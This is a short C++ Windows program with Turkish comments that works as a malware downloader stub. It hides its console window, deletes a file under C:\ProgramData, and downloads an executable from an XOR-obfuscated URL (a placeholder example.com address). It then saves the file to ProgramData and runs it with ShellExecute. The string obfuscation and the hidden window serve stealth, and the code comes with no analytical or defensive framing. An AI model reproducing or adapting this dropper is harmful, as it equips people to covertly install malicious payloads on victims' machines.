#include <iostream>
#include <tchar.h>
#include <string.h>
#include <urlmon.h>
#include <direct.h>
#include "þifreleme.h"
#pragma comment (lib, "urlmon.lib")

using namespace std;


void gizle() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main()
{
	gizle();
    DeleteFileW(_xor_(L"C:\\ProgramData\\test.exe").c_str());
	Sleep(500);
	URLDownloadToFile(NULL, (_xor_(L"https://example.com/app.exe").c_str()), (_xor_(L"C:\\ProgramData\\example.exe").c_str()), 0, NULL); // indirilecek bölüm
	Sleep(1000);
	ShellExecute(NULL, NULL, _xor_(L"C:\\ProgramData\\example.exe").c_str(), NULL, NULL, SW_SHOWNORMAL); // yükletiðiniz program
}



